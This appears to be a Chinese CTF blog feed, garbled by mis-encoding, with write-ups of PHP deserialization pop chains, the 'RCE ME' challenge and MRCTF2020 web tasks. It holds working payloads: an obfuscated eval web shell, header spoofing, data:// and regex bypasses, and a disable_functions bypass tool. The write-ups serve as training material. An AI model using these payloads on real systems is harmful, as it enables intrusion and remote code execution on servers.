SegmentFault æ€å¦</a></p><h3 id="ez-unserialize"><a href="#ez-unserialize" class="headerlink" title="ez_unserialize"></a>ez_unserialize</h3><p><img src="/2021/10/04/web/2/image-20211004210242660.png" alt="image-20211004210242660"></p><p>è¿™é¢˜è™½ç„¶å¾ˆç®€å•ï¼Œè¢«æˆ‘å½“æ—¶ç§’è§£çš„åŸå› ç«Ÿç„¶æ˜¯è¯¯æ‰“è¯¯æ’ï¼ˆdogeï¼‰</p><p>æ‰“å¼€é¶æœºï¼Œå¯çˆ±çš„å°èƒ¡æ¡ƒ</p><p><img src="/2021/10/04/web/2/image-20211009205021612.png" alt="image-20211009205021612"></p><p>f12çœ‹ä¸‹</p><p><img src="/2021/10/04/web/2/image-20211009205055755.png" alt="image-20211009205055755"></p><p>æç¤ºå¾ˆæ˜æ˜¾äº†ï¼Œrobotsåè®®</p><p><img src="/2021/10/04/web/2/image-20211009205151043.png" alt="image-20211009205151043"></p><p>è®¿é—®ä¸€ä¸‹å°±æœ‰é¢˜ç›®æºç äº†ï¼š</p><p><img src="/2021/10/04/web/2/image-20211009205233533.png" alt="image-20211009205233533"></p><p>å¾ˆç®€å•çš„åºåˆ—åŒ–ï¼Œå”¯ä¸€è¦æ³¨æ„çš„ç‚¹æ˜¯ï¼Œæˆ‘ä»¬æƒ³è®©ç±» wllmçš„å±æ€§adminå’Œpasswdçš„å€¼ä¸ºadminå’Œctfï¼Œ</p><p>è€Œé­”æœ¯æ–¹æ³•æ„é€ å´ä¼šå¼ºè¿«è®©ä»–ä»¬å€¼å˜æˆuserå’Œ123456</p><p>æ‰€ä»¥æˆ‘ä»¬åºåˆ—åŒ–çš„æ—¶å€™ç›´æ¥åˆ å»å°±å¥½ï¼Œå°±ä¸ä¼šè§¦å‘äº†</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">show_source(<span class="string">&quot;cl45s.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">wllm</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> $admin = <span class="string">&quot;admin&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $passwd = <span class="string">&quot;ctf&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;admin === <span class="string">&quot;admin&quot;</span> &amp;&amp; <span class="keyword">$this</span>-&gt;passwd === <span class="string">&quot;ctf&quot;</span>)&#123;</span><br><span class="line">            <span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">            <span class="keyword">echo</span> $flag;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;admin;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;passwd;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Just a bit more!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$p = <span class="keyword">new</span> wllm();</span><br><span class="line"><span class="keyword">echo</span>(serialize($p));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/2021/10/04/web/2/image-20211009205525269.png" alt="image-20211009205525269"></p><h3 id="no-wakeup"><a href="#no-wakeup" class="headerlink" title="no_wakeup"></a>no_wakeup</h3><p><a href="https://www.cnblogs.com/Mrsm1th/p/6835592.html">phpååºåˆ—åŒ–æ¼æ´ç»•è¿‡é­”æœ¯æ–¹æ³• __wakeup - Mrsm1th - åšå®¢å›­ (cnblogs.com)</a></p><p><code>$_SERVER[&#39;QUERY_STRING&#39;]</code>ï¼Œä»–éªŒè¯çš„æ—¶å€™æ˜¯ä¸ä¼šè¿›è¡Œurlè§£ç çš„</p><h3 id="pop"><a href="#pop" class="headerlink" title="pop"></a>pop</h3><p>æºä»£ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">show_source(<span class="string">&quot;index.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w44m</span></span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">private</span> $admin = <span class="string">&#x27;aaa&#x27;</span>;</span><br><span class="line">  <span class="keyword">protected</span> $passwd = <span class="string">&#x27;123456&#x27;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Getflag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;admin === <span class="string">&#x27;w44m&#x27;</span> &amp;&amp; <span class="keyword">$this</span>-&gt;passwd ===<span class="string">&#x27;08067&#x27;</span>)&#123;</span><br><span class="line">      <span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">      <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;admin;</span><br><span class="line">      <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;passwd;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&#x27;nono&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w22m</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> $w00m;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;w00m;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w33m</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> $w00m;</span><br><span class="line">  <span class="keyword">public</span> $w22m;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;w00m-&gt;&#123;<span class="keyword">$this</span>-&gt;w22m&#125;();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$w00m = $_GET[<span class="string">&#x27;w00m&#x27;</span>];</span><br><span class="line">unserialize($w00m);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬æ¥åˆ†æåˆ†æ</p><p>æ€»å…±åˆ†ä¸ºäº†ä¸‰ä¸ªç±»å¯¹å§ï¼Œæœ€ç»ˆçš„ç›®çš„æ˜¯æƒ³è§¦å‘ç¬¬ä¸€ä¸ªç±»class w44mé‡Œçš„GetFlag()äº†</p><p>æˆ‘ä»¬è¦å……åˆ†åˆ©ç”¨è¿™ä¸‰ä¸ªç±»</p><p>payloadçš„éƒ¨åˆ†ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$a = <span class="keyword">new</span> w22m();</span><br><span class="line"></span><br><span class="line">$b = <span class="keyword">new</span> w33m();</span><br><span class="line"></span><br><span class="line">$c = <span class="keyword">new</span> w44m();</span><br><span class="line"></span><br><span class="line">$b -&gt; w00m = $c;</span><br><span class="line"></span><br><span class="line">$b -&gt; w22m = <span class="string">&quot;GetFlag&quot;</span>;</span><br><span class="line"></span><br><span class="line">$a -&gt; w00m = $b;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($a));</span><br></pre></td></tr></table></figure><p>é¦–å…ˆä»»å–ä¸‰ä¸ªå˜é‡ï¼Œæ¯”å¦‚æˆ‘è¿™é‡Œå–äº†aï¼Œbï¼Œc</p><p>åˆ†åˆ«èµ‹å€¼æ–°çš„ä¸‰ä¸ªç±»</p><p>è®©å˜é‡bé‡Œçš„å±æ€§w00mèµ‹å€¼ä¸ºw44mï¼Œä¹Ÿå°±æ˜¯æ»¡è¶³</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if($this-&gt;admin &#x3D;&#x3D;&#x3D; &#39;w44m&#39; &amp;&amp; $this-&gt;passwd &#x3D;&#x3D;&#x3D;&#39;08067&#39;)</span><br></pre></td></tr></table></figure><p>å¦å¤–ä¸€ä¸ªå±æ€§w22mèµ‹å€¼â€œGetFlagâ€ï¼Œå®Œæˆè°ƒç”¨å‡½æ•°çš„æ­¥éª¤</p><p>åˆ©ç”¨äº†è¿™å¥**$this-&gt;w00m-&gt;{$this-&gt;w22m}**ï¼Œè¿™æ ·å°±å®ç°w44m -&gt; GetFlag()</p><p>ä¹‹åè®©å˜é‡aé‡Œçš„å±æ€§w00mèµ‹å€¼b</p><p>éšä¹‹ä¼šè§¦å‘ææ„å‡½æ•°_destruct</p><p>æœ€åçš„urlencodeæ˜¯å› ä¸ºé¢˜ç›®é‡Œçš„è·å–å‚æ•°å€¼æ˜¯getè·å–ï¼Œä¼šç»è¿‡æµè§ˆå™¨çš„urlè§£æã€‚</p><p>å®Œæ•´payloadï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w44m</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> $admin = <span class="string">&#x27;w44m&#x27;</span>;</span><br><span class="line">    <span class="keyword">protected</span> $passwd = <span class="string">&#x27;08067&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Getflag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;admin === <span class="string">&#x27;w44m&#x27;</span> &amp;&amp; <span class="keyword">$this</span>-&gt;passwd ===<span class="string">&#x27;08067&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">            <span class="keyword">echo</span> $flag;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;admin;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;passwd;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;nono&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w22m</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $w00m;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;w00m;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w33m</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $w00m;</span><br><span class="line">    <span class="keyword">public</span> $w22m;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;w00m-&gt;&#123;<span class="keyword">$this</span>-&gt;w22m&#125;();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> w22m();</span><br><span class="line">$b = <span class="keyword">new</span> w33m();</span><br><span class="line">$c = <span class="keyword">new</span> w44m();</span><br><span class="line">$b -&gt; w00m = $c;</span><br><span class="line">$b -&gt; w22m = <span class="string">&quot;GetFlag&quot;</span>;</span><br><span class="line">$a -&gt; w00m = $b;</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($a));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/2021/10/04/web/2/image-20211009203101560.png" alt="image-20211009203101560"></p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æå®¢å¤§æŒ‘æˆ˜ 2019 RCE ME</title>
      <link href="/2021/09/29/buu/25/"/>
      <url>/2021/09/29/buu/25/</url>
      
        <content type="html"><![CDATA[<p><img src="/2021/09/29/buu/25/image-20210929213110592.png" alt="image-20210929213110592"></p><p>GETä¼ å‚</p><p>strlenï¼šé•¿åº¦ä¸è¶…è¿‡40</p><p>preg_matchï¼šåŒ¹é…è‹±æ–‡å­—æ¯å’Œæ•°å­—ï¼Œdie NO</p><p>æ»¡è¶³æ¡ä»¶å°±å½“åšphpæ‰§è¡Œå¹¶ä¸”ä¸æŠ¥é”™</p><p>[<a href="https://www.cnblogs.com/yunqian2017/p/13308599.html">æå®¢å¤§æŒ‘æˆ˜ 2019]RCE ME - äº‘åƒ - åšå®¢å›­ (cnblogs.com)</a></p><p>å‚è€ƒï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">å¯ä»¥ç”¨å¼‚æˆ–æˆ–è€…å–åç»•è¿‡</span><br><span class="line">å¼‚æˆ–ç»•è¿‡æ˜¯æŒ‡ä½¿ç”¨å„ç§ç‰¹æ®Šå­—ç¬¦çš„å¼‚æˆ–æ„é€ å‡ºå­—æ¯å’Œæ•°å­—ã€‚å–åç»•è¿‡æ˜¯å¯¹è¯­å¥å–åã€‚</span><br></pre></td></tr></table></figure><p>ç”ŸæˆæŸ¥è¯¢PHP info çš„payloadä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="keyword">echo</span> urlencode(~<span class="string">&#x27;phpinfo&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å³ï¼Œå¯¹æŸ¥è¯¢è¯­å¥å–åï¼Œç„¶åç¼–ç ã€‚åœ¨ç¼–ç å‰åŠ ä¸Š~è¿›è¡Œå–åï¼Œæ‹¬å·æ²¡æœ‰è¢«è¿‡æ»¤ï¼Œä¸ç”¨å–åã€‚</p><p>æ„é€ å®Œçš„è¯­å¥è¿›è¡ŒæŸ¥è¯¢ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code&#x3D;(~%8F%97%8F%96%91%99%90)();</span><br></pre></td></tr></table></figure><p><img src="/2021/09/29/buu/25/image-20210929213713432.png" alt="image-20210929213713432"></p><p>çœ‹ä¸€äº›ä¿¡æ¯:</p><p><img src="/2021/09/29/buu/25/image-20210929213849813.png" alt="image-20210929213849813"></p><p>ç¦ç”¨çš„å‡½æ•°ç›¸å½“çš„å¤š</p><p>å…ˆä¼ æœ¨é©¬è¿æ¥</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$a=<span class="string">&#x27;assert&#x27;</span>;</span><br><span class="line">$b=urlencode(~$a);</span><br><span class="line"><span class="keyword">echo</span> $b;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">$c=<span class="string">&#x27;(eval($_POST[mochu7]))&#x27;</span>;</span><br><span class="line">$d=urlencode(~$c);</span><br><span class="line"><span class="keyword">echo</span> $d;</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code&#x3D;(~%9E%8C%8C%9A%8D%8B)(~%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%92%90%9C%97%8A%C8%A2%D6%D6); </span><br></pre></td></tr></table></figure><p><img src="/2021/09/29/buu/25/image-20210929214111148.png" alt="image-20210929214111148"></p><p>è¿ä¸Šä¹‹åå‘ç°æƒé™è¿‡ä½</p><p><img src="/2021/09/29/buu/25/image-20210929214319688.png" alt="image-20210929214319688"></p><p>è¦è¯»å–flagï¼Œéœ€è¦å…ˆæ‰§è¡Œreadflag,ä½†æ˜¯å› ä¸ºç¦ç”¨äº†å¾ˆå¤šå‡½æ•°ï¼Œæ²¡æœ‰åŠæ³•æ‰§è¡Œå‘½ä»¤ï¼Œè¿™æ—¶å€™éœ€è¦ç»•è¿‡disable_functions.æ–¹æ³•å¥½åƒå¾ˆå¤šï¼Œæœ‰çš„ç”¨èšå‰‘çš„æ’ä»¶ï¼Œæœ‰çš„åŠ«æŒå…±äº«soï¼Œä¹Ÿæœ‰ä¸€äº›å·¥å…·<br>1.è¿™é‡Œç”¨å·¥å…·<br>åœ°å€<a href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD">https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD</a><br>ç”±äºåœ¨/var/tmpç›®å½• æœ‰ä¸Šä¼ æƒé™ï¼Œå¯ä»¥ä¸Šä¼ bypass_disablefun_x64.soå’Œbypass_disablefunc.phpï¼ˆé‡å‘½åä¸ºshell.phpï¼‰ï¼Œ</p><p>2.èšå‰‘æ’ä»¶ç›´æ¥ç»•è¿‡</p><p><img src="/2021/09/29/buu/25/image-20210929214454384.png" alt="image-20210929214454384"></p><p><img src="/2021/09/29/buu/25/image-20210929214557378.png" alt="image-20210929214557378"></p>]]></content>
      
      
      
        <tags>
            
            <tag> buu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MRCTF2020 wirteup</title>
      <link href="/2021/09/28/buu/24/"/>
      <url>/2021/09/28/buu/24/</url>
      
        <content type="html"><![CDATA[<p>â€‹    å‚è€ƒäº†Y1ngå¤§ä½¬çš„åšå®¢ï¼š<a href="https://www.gem-love.com/ctf/2184.html">https://www.gem-love.com/ctf/2184.html</a></p><p>çœŸçš„å†™å¾—å¾ˆæ£’ï¼Œçœ‹ç€ååˆ†èˆ’æœï¼Œè¿˜åœ¨è¯„è®ºåŒºæå‡ºä¸€ç‚¹å°å»ºè®®ï¼ˆå¸Œæœ›ä¸ä¼šè¢«å¸ˆå‚…å˜²ç¬‘ï¼‰</p><h2 id="å¥—å¨ƒ"><a href="#å¥—å¨ƒ" class="headerlink" title="å¥—å¨ƒ"></a>å¥—å¨ƒ</h2><p>è¿™é¢˜éš¾åº¦ä¸å¤§ï¼Œæˆ‘å¡åœ¨äº†ç¼–å†™è„šæœ¬ä¸Š</p><p><img src="/2021/09/28/buu/24/image-20210928193418732.png" alt="image-20210928193418732"></p><p>å¸¸è§„æºç æŸ¥çœ‹</p><p><img src="/2021/09/28/buu/24/image-20210928193507092.png" alt="image-20210928193507092"></p><p>è¿™é‡Œçš„ç»•è¿‡å’ŒBJDCTFçš„Ezphpä¸€æ®µä»£ç ç±»ä¼¼ï¼Œæœ¬æ¥ä»¥ä¸ºä¹Ÿå¯ä»¥urlç¼–ç ç»•è¿‡</p><p>ç»“æœä¸Šé¢å‡ºç°äº†è®¡æ•°ï¼š%5fä¸èƒ½å‡ºç°ï¼Œå› ä¸º_ç¼–ç åå°±æ˜¯%5f,æ‰€ä»¥å°±è¦æ±‚å…¶ä»–æ–¹æ³•ç»•è¿‡äº†</p><p>_ ç”¨ â€˜  â€™ ç»•è¿‡ï¼Œè€Œåé¢çš„æ­£åˆ™åŒ¹é…è¡¨ç¤ºåŒ¹é…å­—ç¬¦ä¸²çš„å¼€å¤´å’Œç»“å°¾</p><p>åœ¨å­—ç¬¦ä¸²ä¸­æ¢è¡Œå¯ä»¥è¡¨ç¤ºå­—ç¬¦ä¸²çš„ç»“å°¾ï¼Œæ‰€ä»¥å¯ä»¥ç”¨%0aï¼ˆæ¢è¡Œç¬¦çš„urlç¼–ç ï¼‰ç»•è¿‡</p><p>æ‰€ä»¥payloadï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?b u p t&#x3D;23333%0a</span><br></pre></td></tr></table></figure><p><img src="/2021/09/28/buu/24/image-20210928194036030.png" alt="image-20210928194036030"></p><p>å¾—åˆ°æç¤º</p><p>å»è®¿é—®secrettw.phpé¡µé¢</p><p><img src="/2021/09/28/buu/24/image-20210928194130440.png" alt="image-20210928194130440"></p><p>whoaï¼Œè¢«æŒ¡äº†</p><p>æ·»åŠ Client-ipï¼š127.0.0.1</p><p><img src="/2021/09/28/buu/24/image-20210928194319439.png" alt="image-20210928194319439"></p><p>å†æ¬¡æŸ¥çœ‹æºç ï¼š</p><p><img src="/2021/09/28/buu/24/image-20210928194351650.png" alt="image-20210928194351650"></p><h4 id="jsfuck"><a href="#jsfuck" class="headerlink" title="jsfuck"></a>jsfuck</h4><p>åŸæ¥æ˜¯å’Œjsæœ‰å…³çš„ä»£ç ï¼Œ</p><p><img src="/2021/09/28/buu/24/image-20210928194516235.png" alt="image-20210928194516235"></p><p>æç¤ºæˆ‘ä»¬posyä¼ å‚Merak</p><p>ä»»æ„èµ‹å€¼ï¼šMerak=1</p><p><img src="/2021/09/28/buu/24/image-20210928194610158.png" alt="image-20210928194610158"></p><p>å¥½äº†ï¼Œæºç å‡ºæ¥äº†</p><p>ä»£ç åˆ†æï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">function change($v)&#123; </span><br><span class="line">  $v &#x3D; base64_decode($v); </span><br><span class="line">  $re &#x3D; &#39;&#39;; </span><br><span class="line">  for($i&#x3D;0;$i&lt;strlen($v);$i++)&#123; </span><br><span class="line">    $re .&#x3D; chr ( ord ($v[$i]) + $i*2 ); </span><br><span class="line">  &#125; </span><br><span class="line">  return $re; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå¯ä»¥å†™ä¸€ä¸ªé€†å‘çš„è„šæœ¬æ¥æ»¡è¶³è¦æ±‚ï¼š</p><h4 id="é€†æ–¹å‘è„šæœ¬"><a href="#é€†æ–¹å‘è„šæœ¬" class="headerlink" title="é€†æ–¹å‘è„šæœ¬"></a>é€†æ–¹å‘è„šæœ¬</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function unchange($v)&#123; </span><br><span class="line">    $re &#x3D; &#39;&#39;;</span><br><span class="line">    for($i&#x3D;0;$i&lt;strlen($v);$i++)&#123; </span><br><span class="line">        $re .&#x3D; chr ( ord ($v[$i]) - $i*2 ); </span><br><span class="line">    &#125; </span><br><span class="line">    return $re; </span><br><span class="line">&#125;</span><br><span class="line">$real_flag &#x3D; unchange(&#39;flag.php&#39;);</span><br><span class="line">echo base64_encode($real_flag);</span><br><span class="line">&#x2F;&#x2F;ZmpdYSZmXGI&#x3D;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>å¾—åˆ°ï¼šZmpdYSZmXGI=</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ip &#x3D; getIp();</span><br><span class="line">if($ip!&#x3D;&#39;127.0.0.1&#39;)</span><br><span class="line">echo &quot;Sorry,you don&#39;t have permission! Your ip is :&quot;.$ip;</span><br><span class="line">if($ip &#x3D;&#x3D;&#x3D; &#39;127.0.0.1&#39; &amp;&amp; file_get_contents($_GET[&#39;2333&#39;]) &#x3D;&#x3D;&#x3D; &#39;todat is a happy day&#39; )&#123;</span><br><span class="line">echo &quot;Your REQUEST is:&quot;.change($_GET[&#39;file&#39;]);</span><br><span class="line">echo file_get_contents(change($_GET[&#39;file&#39;])); &#125;</span><br></pre></td></tr></table></figure><p>ipæˆ‘ä»¬å·²ç»æ·»åŠ äº†</p><h4 id="dataä¼ªåè®®"><a href="#dataä¼ªåè®®" class="headerlink" title="dataä¼ªåè®®"></a>dataä¼ªåè®®</h4><p>ä¼ å…¥å‚æ•°2333ç”¨ä¼ªåè®®ç»•è¿‡ï¼Œ?2333=data://text/plain,todat is a happy day</p><p>è¿™é‡Œæœ‰çš„å¸ˆå‚…ç‰¹æ„ç”¨äº†base64ç»•è¿‡ï¼šdata://text/plain;base64,dG9kYXQgaXMgYSBoYXBweSBkYXk=</p><p>fileä¼ å…¥æˆ‘ä»¬å°šä¹¦è„šæœ¬è·‘å‡ºçš„æ•°æ®ï¼šfile=ZmpdYSZmXGI=</p><p>åˆ°è¿™é‡Œå°å¿ƒä¸€ä¸ªå‘ï¼Œå°±æ˜¯ä¸ç”¨å†postä¼ å‚äº†ï¼š</p><p>ä¸ç„¶ä¼šè¢«highlight_fileå‡½æ•°æˆªæ–­</p><p>ç„¶åä¸€é”®flagå•¦</p><p><img src="/2021/09/28/buu/24/image-20210928195347754.png" alt="image-20210928195347754"></p><p><img src="/2021/09/28/buu/24/image-20210928195408850.png" alt="image-20210928195408850"></p><h2 id="Ez-bypass"><a href="#Ez-bypass" class="headerlink" 